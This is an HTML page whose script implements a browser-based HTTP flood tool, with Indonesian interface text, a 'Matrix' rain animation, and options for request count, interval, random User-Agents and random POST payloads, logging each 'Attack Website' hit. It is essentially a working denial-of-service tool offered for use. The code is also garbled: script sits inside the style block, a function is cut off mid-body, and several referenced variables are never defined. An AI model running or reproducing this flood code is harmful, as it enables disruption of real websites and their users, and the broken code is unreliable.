    <style>
        body {
            background-color: #000;
            color: #00ff00;
            font-family: monospace;
            overflow: hidden;
        }

        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .matrix-column {
            position: absolute;
            top: -20px;
            display: flex;
            flex-direction: column;
        }

        h1,
        form,
        #hasil {
            position: relative;
            z-index: 1;
        }

        #start,
        #stop {

        }

        #hasil {
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #00ff00;
            padding: 5px;
        }

        .dropdown {
            position: relative;
            display: inline-block;
        }

        .dropdown-button {
            background-color: transparent;
            /* Menghapus warna hijau */
            border: 1px solid #00ff00;
            /* Menambahkan border hijau agar tetap terlihat */
            color: #00ff00;
            /* Warna teks hijau */
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
        }

        .dropdown-content {
            display: none;
            position: absolute;
            background-color: #f9f9f9;
            min-width: 160px;
            box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);
            z-index: 1;
        }

        .dropdown-content button {
            color: black;
            padding: 12px 16px;
            text-decoration: none;
            display: block;
            border: none;
            background-color: transparent;
            cursor: pointer;
            width: 100%;
            text-align: left;
        }

        .dropdown-content button:hover {
            background-color: #ddd;
        }

        .dropdown:hover .dropdown-content {
            display: block;
        }

        function generateRandomString(length) {
            let result = '';
            for (let i = 0; i < length; i++) {

        }

                matrixDiv.appendChild(column);
                for (let j = 0; j < Math.floor(Math.random() * 15) + 5; j++) {
                    const charSpan = document.createElement('span');
                    charSpan.textContent = characters[Math.floor(Math.random() * characters.length)];
                    column.appendChild(charSpan);
                }
            }
        };

        const animateMatrix = () => {
            const columns = document.querySelectorAll('.matrix-column');
            columns.forEach(column => {
                let top = column.offsetTop;
                const speed = parseFloat(column.dataset.speed);
                top += speed;
                column.style.top = `${top}px`;
                if (top > window.innerHeight) {
                    column.style.top = `-${Math.floor(Math.random() * 50) + 20}px`;
                    column.innerHTML = '';
                    for (let j = 0; j < Math.floor(Math.random() * 15) + 5; j++) {
                        const charSpan = document.createElement('span');
                        charSpan.textContent = characters[Math.floor(Math.random() * characters.length)];
                        column.appendChild(charSpan);
                    }
                }
            });
            requestAnimationFrame(animateMatrix);
        };

        initMatrix();
        animateMatrix();
        window.addEventListener('resize', initMatrix);

        const timeout = (ms, promise) => {
            return new Promise((resolve, reject) => {
                setTimeout(() => {
                    reject(new Error("Timeout Ð¿Ñ€ÐµÐ²Ñ‹ÑˆÐµÐ½"))
                }, ms)
                promise.then(resolve, reject)
            })
        }

        const enqueueLog = (message) => {
            logBuffer.push(message);
            updateLogDisplay()
        };

        const updateLogDisplay = () => {
            if (logBuffer.length > 0) {
                hasilDiv.innerHTML += logBuffer.join('');
                logBuffer = [];
                hasilDiv.scrollTop = hasilDiv.scrollHeight;
            }
        };

        setInterval(updateLogDisplay, 350);

        dropdownContent.addEventListener('click', (event) => {
            if (event.target.tagName === 'BUTTON') {
                event.preventDefault();
                selectedMethod = event.target.dataset.method;
                dropdownButton.textContent = event.target.textContent;
                trafficOptions.style.display = selectedMethod === 'traffic' ? 'block' : 'none';
                floodsOptions.style.display = selectedMethod === 'floods' ? 'block' : 'none';
                startBtn.focus();
            }
        });

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        const processQueue = async () => {
            if (!isRunning) {
                console.log("processQueue dihentikan.");
                return;
            }
            if (requestQueue.length === 0) {
                isRunning = false;
                console.log("requestQueue kosong, processQueue dihentikan.");
                return;
            }

            const i = requestQueue.shift();
            const url = urlInput.value;
            const interval = parseInt(intervalInput.value);
            let maxRetries = 3;
            let retries = 0;

            try {
                let requestOptions = {
                    mode: 'no-cors',
                    headers: {}
                };

                if (randomUserAgentCheckbox.checked) {
                    requestOptions.headers['User-Agent'] = getRandomUserAgent();
                }

                if (selectedMethod === 'floods') {
                    const floodType = document.getElementById('flood-type').value;
                    if (floodType === 'HTTP') {
                        const trafficType = document.getElementById('traffic-type').value;
                        let trafficPayload = trafficPayloadInput.value;

                        if (autoPayloadCheckbox.checked && !trafficPayload) {
                            trafficPayload = generateRandomString(20);
                            trafficPayloadInput.value = trafficPayload;
                        }

                        requestOptions.method = trafficType;
                        if (trafficType === 'POST') {
                            requestOptions.body = trafficPayload;
                        }
                    }

                    while (retries < maxRetries) {
                        try {
                            const response = await fetch(url, requestOptions);

                            if (response) {
                                logBuffer.push(`Request ${i + 1} berhasil dikirim (${floodType} Flood).<br>`);
                                console.log(`%cSuccessfully Attack Website ${i + 1}/${jumlahRequestInput.value}`, 'color: green;');
                                break;
                            }
                        } catch (error) {
                            retries++;
                            logBuffer.push(`Request ${i + 1} gagal (${floodType} Flood, percobaan ${retries}/${maxRetries}): ${error.message}<br>`);
                            console.error(`Request ${i + 1} gagal (percobaan ${retries}/${maxRetries}):`, error);
                            console.log(`%cFailed to Attack Website ${i + 1}/${jumlahRequestInput.value}`, 'color: red;');
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    }

                    if (retries === maxRetries) {
                        logBuffer.push(`Request ${i + 1} gagal setelah ${maxRetries} percobaan.<br>`);
                        console.warn(`Request ${i + 1} gagal setelah ${maxRetries} percobaan.`);
                    }

                } else if (selectedMethod === 'traffic') {
                    const trafficType = document.getElementById('traffic-type').value;
                    let trafficPayload = trafficPayloadInput.value;

                    if (autoPayloadCheckbox.checked && !trafficPayload) {
                        trafficPayload = generateRandomString(20);
                        trafficPayloadInput.value = trafficPayload;
                    }
                    requestOptions.method = trafficType;
                    if (trafficType === 'POST') {
                        requestOptions.body = trafficPayload;
                    }

                    while (retries < maxRetries) {
                        try {
                            const response = await fetch(url, requestOptions);

                            if (response) {
                                logBuffer.push(`Request ${i + 1} berhasil dikirim (${trafficType}).<br>`);
                                console.log(`%cSuccessfully Attack Website ${i + 1}/${jumlahRequestInput.value}`, 'color: green;');
                                break;
                            }
                        } catch (error) {
                            retries++;
                            logBuffer.push(`Request ${i + 1} gagal (${trafficType}, percobaan ${retries}/${maxRetries}): ${error.message}<br>`);
                            console.error(`Request ${i + 1} gagal (percobaan ${retries}/${maxRetries}):`, error);
                            console.log(`%cFailed to Attack Website ${i + 1}/${jumlahRequestInput.value}`, 'color: red;');
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    }

                    if (retries === maxRetries) {
                        logBuffer.push(`Request ${i + 1} gagal setelah ${maxRetries} percobaan.<br>`);
                        console.warn(`Request ${i + 1} gagal setelah ${maxRetries} percobaan.`);
                    }
                }

            } catch (error) {
                logBuffer.push(`Terjadi kesalahan: ${error.message}<br>`);
                console.error("Terjadi kesalahan:", error);
            }

            if (isRunning) {
                await delay(interval);
                processQueue();
            }
        };

        startBtn.addEventListener('click', () => {
            if (isRunning) {
                return;
            }

            if (!selectedMethod) {
                hasilDiv.innerHTML = 'Pilih metode serangan terlebih dahulu.';
                console.error('Pilih metode serangan terlebih dahulu.');
                return;
            }

            const url = urlInput.value;
            const urlRegex = new RegExp(/^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$/);
            if (!urlRegex.test(url)) {
                hasilDiv.innerHTML = 'URL tidak valid.';
                console.error('URL tidak valid.');
                return;
            }

            hasilDiv.innerHTML = '';
            requestQueue = [];
            logBuffer = [];

            const jumlahRequest = parseInt(jumlahRequestInput.value, 10);
            for (let i = 0; i < jumlahRequest; i++) {
                requestQueue.push(i);
            }

            isRunning = true;
            processQueue();
        });

        stopBtn.addEventListener('click', () => {
            isRunning = false;
            console.log("Tombol Stop ditekan, isRunning diatur ke false.");
            hasilDiv.innerHTML += 'Serangan sudah dihentikan. .<br>';
        });
    </script>
</body>

</html>
